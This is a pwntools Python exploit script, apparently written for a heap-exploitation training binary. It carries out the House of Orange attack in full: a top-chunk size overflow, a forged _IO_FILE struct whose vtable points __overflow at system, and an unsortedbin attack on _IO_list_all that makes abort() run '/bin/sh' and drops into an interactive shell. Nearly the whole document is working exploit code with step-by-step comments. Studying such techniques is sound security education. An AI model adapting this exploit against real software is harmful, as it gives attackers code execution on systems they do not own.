#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("house_of_orange")
libc = elf.libc

gs = '''
set breakpoint pending on
break _IO_flush_all_lockp
enable breakpoints once 1
continue
'''
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return process(elf.path)

# Select the "malloc (small)" option.
def small_malloc():
    io.send("1")
    io.recvuntil("> ")

# Select the "malloc (large)" option.
def large_malloc():
    io.sendthen("> ", "2")

# Select the "edit (1st small chunk)" option; send data.
def edit(data):
    io.send("3")
    io.sendafter("data: ", data)
    io.recvuntil("> ")

io = start()

# This binary leaks the address of puts(), use it to resolve the libc load address.
io.recvuntil("puts() @ ")
libc.address = int(io.recvline(), 16) - libc.sym.puts

# This binary leaks the heap start address.
io.recvuntil("heap @ ")
heap = int(io.recvline(), 16)
io.recvuntil("> ")
io.timeout = 0.1

# =============================================================================

# =-=-=- GENERATE A FREE CHUNK -=-=-=

# Request a small chunk to overflow from.
small_malloc() # size 0x20

# Overflow the small chunk into the top chunk size field.
# Shrink the top chunk size field so it can be exhausted by a large request.
# Ensure the top chunk ends on a page boundary and has the prev_inuse bit set.

# $ getconf PAGE_SIZE
page_size = 0x1000
already_allocated = 0x20
prev_inuse = 0x1

edit(b"Y"*24 + p64(page_size - already_allocated + prev_inuse))

# Request a large chunk to exhaust the top chunk and trigger top extension code.
# The old top chunk is non-contiguous to the new memory so the new memory becomes the
# top chunk and the old top chunk is freed.
large_malloc() # This chunk will be allocated from the new top chunk.

# =============================================================================

# =-=-=- PREPARE A FAKE _IO_FILE STRUCT -=-=-=

# Set up a fake _IO_FILE struct.

# The first qword of _IO_FILE struct. 
# We set it so that _IO_OVERFLOW(fp, EOF) becomes the equivalent of system("/bin/sh")
# during the attack.
flags = b"/bin/sh\x00"

# This chunk is sorted into the 0x60 smallbin later, meaning a pointer to it will form
# the _chain member of the _IO_FILE struct overlapping the main arena.
size = 0x61

# A chunk's fd is ignored during a partial unlink
fd = 0xdeadbeef

# Set up the bk pointer of this free chunk to point near _IO_list_all.
# This way _IO_list_all is overwritten by a pointer to the unsortedbin during the unsortedbin attack.
bk = libc.sym._IO_list_all - 0x10

# Ensure fp->_IO_write_ptr > fp->_IO_write_base. 
# (libio/genops.c:779)
write_base = 0x1
write_ptr = 0x2

# Ensure fp->_mode <= 0.
# (libio/genops.c:779)
mode = 0x0

# The last qword of _IO_FILE struct, which is a part of the _unused2 area.
# We place the system function here to point our fake vtable __overflow entry there.
overflow = libc.sym.system

# Set up the vtable pointer so that the __overflow entry points to the system function.
vtable_ptr = heap + 0xd8

# Use the overflow to write the fake _IO_FILE struct over the old top chunk.
fake_io_file = flags + p64(size) +\
        p64(fd) + p64(bk) +\
        p64(write_base) + p64(write_ptr) +\
        p64(0) * 18 + p32(mode) + p32(0) +\
        p64(0) + p64(overflow) + p64(vtable_ptr)

edit(b"Y"*16 + fake_io_file)

# =============================================================================

# =-=-=- TRIGGER THE UNSORTEDBIN ATTACK -=-=-=

# Request the second small chunk. This sorts the old top chunk into the 0x60 smallbin and while doing so triggers
# the unsortedbin attack against _IO_list_all.
# The "chunk" at _IO_list_all will fail a size sanity check, causing malloc to call abort(). This in turn will
# call _IO_flush_all_lockp().
# The main arena (sometimes) fails the _IO_OVERFLOW checks and fp->_chain is followed which points to the old
# top chunk. Now the fake _IO_FILE struct is processed and the _IO_OVERFLOW checks will pass, the fake
# vtable pointer is followed and the fake __overflow entry is called.
small_malloc()

# =============================================================================

io.interactive()
